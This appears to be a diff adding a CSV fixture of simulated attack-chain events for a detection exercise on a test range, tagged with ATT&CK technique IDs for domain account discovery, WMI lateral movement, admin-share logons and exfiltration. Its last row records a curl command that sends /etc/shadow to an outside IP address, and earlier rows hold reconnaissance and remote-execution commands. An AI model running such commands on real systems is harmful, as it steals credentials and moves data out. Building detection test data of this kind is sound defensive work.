@@ -1,0 +1,5 @@
+event_id,step_id,technique_id,timestamp,host,source,process_name,command_line,user
+evt-101,step-01-recon,T1087,2026-09-06T12:00:01Z,srv-dc-01.range.corp,sysmon,net.exe,net user /domain,CORP\testadmin
+evt-102,step-02-lateral,T1047,2026-09-06T12:01:15Z,srv-app-02.range.corp,sysmon,wmic.exe,wmic /node:srv-app-02 process call create,CORP\testadmin
+evt-103,step-03-anomaly,T1021.002,2026-09-06T12:02:30Z,srv-db-01.range.corp,security_event,lsass.exe,Logon Type 3 IPC$ / C$,CORP\admin
+evt-104,step-04-exfil,T1048,2026-09-06T12:03:45Z,srv-exfil-01.range.corp,network_flow,curl,curl --data-binary @/etc/shadow http://198.51.100.22/collect,root
